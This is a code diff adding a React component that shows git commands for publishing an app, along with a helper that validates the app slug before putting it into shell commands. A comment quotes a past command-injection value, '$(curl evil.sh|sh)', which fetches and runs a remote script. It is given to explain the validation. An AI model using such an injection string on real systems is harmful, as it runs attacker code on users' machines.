@@ -79,6 +79,67 @@ export function KeyBackupDownload({ label = 'Download backup' }: { label?: strin
   );
 }
 
+/**
+ * The commands that make a project's git repository publish to this app. The app's name is the username in the
+ * address, which is what makes git's credential helpers keep this app's key apart from another's. The key itself never
+ * goes in the address: that would put it in the repository's config, in plain text. `http.postBuffer` makes git send a
+ * large push with its length: sent in chunks, PHP behind Apache's FastCGI or CGI receives none of it.
+ *
+ * The remote's own push refspec makes a plain `git push softn` publish the commit checked out, from any branch. Without
+ * it git answers that with `git push --set-upstream softn main`, and a branch that follows that pulls from the directory
+ * from then on, which serves no fetches: every `git pull` fails, a project's own remote set aside. `skipFetchAll` leaves
+ * it out of `git fetch --all` and `git remote update`.
+ *
+ * These get pasted into a shell, so nothing goes in but what the directory itself allows as a name (Catalog::validSlug),
+ * and anything else gives no commands. The directory answers loose spellings of a name, so a value from an address is
+ * not one: `?update=$(curl evil.sh|sh)` opened a real app's page and put that in the commands.
+ */
+export function gitCommands(slug: string, origin: string): string {
+  if (!/^[a-z0-9][a-z0-9-]{0,63}$/.test(slug)) return '';
+  const site = new URL(origin);
+  return [
+    `git remote add softn ${site.protocol}//${slug}@${site.host}/api/git/${slug}.git`,
+    'git config remote.softn.push HEAD:refs/heads/main',
+    'git config remote.softn.skipFetchAll true',
+    'git config http.postBuffer 64M',
+    'git push softn',
+  ].join('\n');
+}
+
+/** Publishing the next versions of an app from a git repository, with its edit key as the password. */
+export function PushWithGit({ slug }: { slug: string }): React.ReactElement | null {
+  const [copied, setCopied] = useState(false);
+  const commands = gitCommands(slug, window.location.origin);
+  if (!commands) return null;
+  return (
+    <section className="git-push">
+      <h3 className="side-title">Publish new versions with git</h3>
+      <p className="muted">
+        Run these once in the app’s git repository, with its <code>manifest.json</code> at the top. From then on,{' '}
+        <code>git push softn</code> publishes the commit you are on, from any branch. When git asks for a password, give it
+        the edit key. Where git keeps passwords, it keeps this app’s under the app’s name.
+      </p>
+      <pre className="source-code">
+        <code>{commands}</code>
+      </pre>
+      <button
+        type="button"
+        className="link-btn"
+        onClick={async () => {
+          setCopied(await copyText(commands));
+          setTimeout(() => setCopied(false), 1200);
+        }}
+      >
+        {copied ? 'Copied' : 'Copy the commands'}
+      </button>
+      <p className="muted">
+        Each push to <code>main</code> is a new version, made of the files in that commit. Earlier commits are not kept, and an app
+        keeps its first version and its latest ones. Everything in the commit is public, so keep keys and passwords out of it.
+      </p>
+    </section>
+  );
+}
+
 /** What a key replacement left: the new key, and how keeping it here went (null: it was not to be kept). */
 export interface ReplacedKey {
   key: string;
